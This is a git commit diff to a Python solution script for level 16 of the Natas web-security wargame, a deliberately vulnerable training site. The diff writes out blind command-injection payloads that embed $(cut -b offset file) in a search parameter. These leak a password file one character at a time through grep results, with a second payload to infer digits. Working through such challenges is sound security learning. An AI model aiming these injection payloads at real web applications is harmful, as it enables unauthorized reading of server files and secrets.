e3fffeaace6ef3cdfc6ae098c88081cd1a4f8454
Evan Johnson <evanj2357@gmail.com>
2021-06-22 16:40:27 -0700

    can extract digits and letters

--- solutions/natas16.py
+++ solutions/natas16.py
@@ -12,26 +12,40 @@ from natas_utils import *
 LEVEL = 16
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
+    print(extract_character(url, login, 1))
+    print(extract_character(url, login, 2))
+
+    return None
+    # this will fail
+    # return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))
+
+def extract_character(url: str, login: LevelLogin, offset: int) -> Optional[str]:
     flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"
 
+    # Preliminary payload: match first chars of words against selected char in password.
     # the `cut` utility allows extraction of single bytes per line
     # using 1-indexed offsets
-    i = 3
-    payload = f"^$(cut -b {i} {flag_file_abspath})"
+    payload = f"^$(cut -b {offset} {flag_file_abspath})"
 
     params = {
         "needle": payload,
         "submit": "Search",
     }
-    print(params)
     response = requests.get(url, auth=login, params=params)
-    print(response.text)
-
     results = get_grep_output(response)
-    print(results)
 
-    # this will fail
-    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))
+    if len(results) > 0:
+        return results[0][0]
+    else:
+        # if no character match, char is likely a digit
+        # Digit payload: match against word length.
+        payload = "^.\\{" + f"$(cut -b {offset} {flag_file_abspath})" + "\\}$"
+        params["needle"] = payload
+
+        response = requests.get(url, auth=login, params=params)
+        results = get_grep_output(response)
+        return None if not len(results) > 0 else str(len(results[0]))
+
 
 def get_grep_output(response: requests.Response) -> List[str]:
     soup = BeautifulSoup(response.text, "html.parser")
